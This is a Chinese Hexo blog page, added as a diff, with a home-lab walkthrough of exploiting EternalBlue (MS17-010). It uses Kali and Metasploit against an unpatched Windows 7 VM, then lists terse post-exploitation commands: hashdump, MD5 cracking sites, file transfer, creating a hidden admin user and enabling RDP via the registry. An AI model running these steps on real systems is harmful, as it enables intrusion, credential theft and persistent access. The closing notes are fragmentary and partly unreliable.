@@ -1,0 +1,397 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.0.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha256-CTSx/A06dm1B063156EVh15m6Y67pAjZZaQc89LLSrU=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.18.2","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="前提有 cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso 镜像文件，并且创建了虚拟机win7，并且开启桥接模式或NAT模式，建议开桥接模式 有 kali-linux-2023-W10-vmware-amd64.vmwarevm.zip 文件，解压并且添加到虚拟机上，开启桥接模式或NAT模式，建议开桥接模式  这次是kali攻击win7。攻击机-">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝">
+<meta property="og:url" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前提有 cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso 镜像文件，并且创建了虚拟机win7，并且开启桥接模式或NAT模式，建议开桥接模式 有 kali-linux-2023-W10-vmware-amd64.vmwarevm.zip 文件，解压并且添加到虚拟机上，开启桥接模式或NAT模式，建议开桥接模式  这次是kali攻击win7。攻击机-">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_29_15_851.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_37_16_9.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_37_47_308.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_39_11_253.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_43_11_641.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_01_16_681.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_03_38_619.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_08_45_744.png">
+<meta property="og:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_09_06_742.png">
+<meta property="article:published_time" content="2023-11-10T11:23:25.000Z">
+<meta property="article:modified_time" content="2023-11-14T01:31:18.090Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="网络">
+<meta property="article:tag" content="漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_29_15_851.png">
+
+
+<link rel="canonical" href="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/","path":"2023/11/10/永恒之蓝/","title":"永恒之蓝"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>永恒之蓝 | Hexo</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Hexo</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E6%8F%90"><span class="nav-number">1.</span> <span class="nav-text">前提</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="nav-number">1.1.</span> <span class="nav-text">1、主机发现：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E4%BD%BF%E7%94%A8-MSF-%E7%9A%84%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E6%A8%A1%E5%9D%97"><span class="nav-number">1.2.</span> <span class="nav-text">2、使用 MSF 的永恒之蓝漏洞模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E4%BD%BF%E7%94%A8ms17-010%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F%EF%BC%9A"><span class="nav-number">1.3.</span> <span class="nav-text">3、使用ms17-010扫描模块，对靶机进行扫描：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E4%BD%BF%E7%94%A8ms17-010%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E9%9D%B6%E6%9C%BA%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="nav-number">1.4.</span> <span class="nav-text">4、使用ms17-010攻击模块，对靶机进行攻击</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5%E3%80%81%E5%BE%97%E5%88%B0%E9%9D%B6%E6%9C%BAshell"><span class="nav-number">1.5.</span> <span class="nav-text">5、得到靶机shell</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">John Doe</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">6</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">10</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="John Doe">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="永恒之蓝 | Hexo">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          永恒之蓝
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2023-11-10 19:23:25" itemprop="dateCreated datePublished" datetime="2023-11-10T19:23:25+08:00">2023-11-10</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2023-11-14 09:31:18" itemprop="dateModified" datetime="2023-11-14T09:31:18+08:00">2023-11-14</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E7%BD%91%E7%BB%9C/" itemprop="url" rel="index"><span itemprop="name">网络</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h2><p>有 <code>cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso</code> 镜像文件，并且创建了虚拟机win7，并且开启桥接模式或NAT模式，建议开桥接模式</p>
+<p>有 <code>kali-linux-2023-W10-vmware-amd64.vmwarevm.zip</code> 文件，解压并且添加到虚拟机上，开启桥接模式或NAT模式，建议开桥接模式</p>
+<blockquote>
+<p>这次是kali攻击win7。攻击机-kali：192.168.0.65。靶机-win7：192.168.0.64</p>
+<p>两台机子可以相互ping通，并且靶机（无补丁）开启了445端口，防火墙是关闭的！</p>
+</blockquote>
+<p>对win7的cmd <code>ipconfig</code> 一下，对kali的终端 <code>ifconfig</code> 一下，使得二者可以相互 <code>ping</code> 通</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">win7:ping 192.168.0.65</span><br><span class="line">//kali:ping 192.168.0.64         #kali是Linux，使用 ping 命令会一直 ping 下去，所以需要使用下面的命令</span><br><span class="line">kali:ping -c 4 192.168.0.64    #4是ping的次数</span><br></pre></td></tr></table></figure>
+
+<p>如果在kali上不小心使用了 <code>ping</code> 命令，使用 <code>Ctrl</code> + <code>C</code> 中断。</p>
+<p>如果不放心可以查看进程 <code>ps</code>，再去查查PID和怎么杀死进程。</p>
+<h3 id="1、主机发现："><a href="#1、主机发现：" class="headerlink" title="1、主机发现："></a>1、主机发现：</h3><p>登录 kali linux，用 nmap 探测本网段存活主机</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.0.64/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_29_15_851.png"></p>
+<p>可以看到，靶机的445端口是开放的，而永恒之蓝利用的就是445端口的SMB服务，操作系统溢出漏洞。</p>
+<h3 id="2、使用-MSF-的永恒之蓝漏洞模块"><a href="#2、使用-MSF-的永恒之蓝漏洞模块" class="headerlink" title="2、使用 MSF 的永恒之蓝漏洞模块"></a>2、使用 MSF 的永恒之蓝漏洞模块</h3><p>打开MSF：（MSF每次打开都会有一个随机的界面，花里胡哨的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_37_16_9.png"></p>
+<blockquote>
+<p>如果想要看其它界面可以输入 <code>banner</code> 查看</p>
+</blockquote>
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_37_47_308.png"></p>
+<p>搜索 ms17-010 代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_39_11_253.png"></p>
+<p>一般会有4个结果</p>
+<p>这里可以得到一些工具，其中 <code>auxiliary/scanner/smb/smb_ms17_010</code> 是永恒之蓝扫描模块， <code>exploit/windows/smb/ms17_010_eternalblue</code> 是永恒之蓝攻击模块。</p>
+<p>一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。</p>
+<h3 id="3、使用ms17-010扫描模块，对靶机进行扫描："><a href="#3、使用ms17-010扫描模块，对靶机进行扫描：" class="headerlink" title="3、使用ms17-010扫描模块，对靶机进行扫描："></a>3、使用ms17-010扫描模块，对靶机进行扫描：</h3><p>使用模块 <code>use 3</code> ，可以使用 <code>show options</code> 命令查看设置选项，Required的yes是必须要有的，所以要设置 <code>RHOSTS</code> ，也就是目标靶 <code>set rhosts 192.168.0.64 </code> 。然后扫描探索一下 <code>exploit </code>。</p>
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_20_43_11_641.png"></p>
+<p>如果出现 <code>Host is likely VULNERABLE to MS17-010!</code> 的情况，就说明存在漏洞。</p>
+<h3 id="4、使用ms17-010攻击模块，对靶机进行攻击"><a href="#4、使用ms17-010攻击模块，对靶机进行攻击" class="headerlink" title="4、使用ms17-010攻击模块，对靶机进行攻击"></a>4、使用ms17-010攻击模块，对靶机进行攻击</h3><p>使用模块 <code>use 0</code> ，可以使用 <code>show options</code> 命令查看设置选项，Required的yes是必须要有的，所以要设置 <code>RHOSTS</code> ，也就是目标靶 <code>set rhosts 192.168.0.64 </code> 。然后执行攻击： <code>exploit</code> 或 <code>run</code> 。</p>
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_01_16_681.png"></p>
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_03_38_619.png"></p>
+<p>攻击完成！</p>
+<h3 id="5、得到靶机shell"><a href="#5、得到靶机shell" class="headerlink" title="5、得到靶机shell"></a>5、得到靶机shell</h3><p>输入 <code>shell</code> 可进入靶机的命令提示符窗口，再输入 <code>ipconfig</code> 查看靶机的IP地址。（发现会乱码）</p>
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_08_45_744.png"></p>
+<p>输入：chcp 65001 可解决乱码问题。</p>
+<blockquote>
+<p>因为windows的代码页编号是936，而</p>
+</blockquote>
+<p><img src="/2023/11/10/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/%E5%B1%8F%E5%B9%95%E6%8D%95%E8%8E%B7_2023_11_13_21_09_06_742.png"></p>
+<p>挂起：background</p>
+<p>查看：show sessions</p>
+<p>进入：sessions 3</p>
+<p>shell</p>
+<p>whoami</p>
+<p>net</p>
+<p>net user</p>
+<p>chcp 65001</p>
+<p>sysinfo</p>
+<p>getuid</p>
+<p>hashdump</p>
+<p>shell</p>
+<p>net user</p>
+<p>md5在线解密</p>
+<p><a target="_blank" rel="noopener" href="https://www.cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.somd5.com/">MD5免费在线解密破解_MD5在线加密-SOMD5</a></p>
+<p>upload &#x2F;home&#x2F;kali&#x2F;666.jpg C:&#x2F;windows&#x2F;temp</p>
+<p>shell</p>
+<p>dir</p>
+<p>download C:&#x2F;windows&#x2F;temp&#x2F;66.jpg &#x2F;home&#x2F;kali&#x2F;</p>
+<p>新建用户：net user  user02 passwd &#x2F;add</p>
+<p>添加用户组：net localgroup Administrators user02 &#x2F;add</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43847838/article/details/121971441">https://blog.csdn.net/weixin_43847838/article/details/121971441</a></p>
+<p>开启远程服务：net user user02 &#x2F;active:yes</p>
+<p>C:\Windows\system32&gt;reg add “HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server” &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</p>
+<p>telnet -l 192.168.0.17</p>
+<p>192.168.0.17:3389</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag"># 网络</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E/" rel="tag"># 漏洞</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/11/09/hexo%E5%8D%9A%E5%AE%A2%E6%9B%B4%E6%8D%A2%E4%B8%BB%E9%A2%98/" rel="prev" title="hexo博客更换主题">
+                  <i class="fa fa-angle-left"></i> hexo博客更换主题
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/11/13/phpstudy/" rel="next" title="php">
+                  php <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">John Doe</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
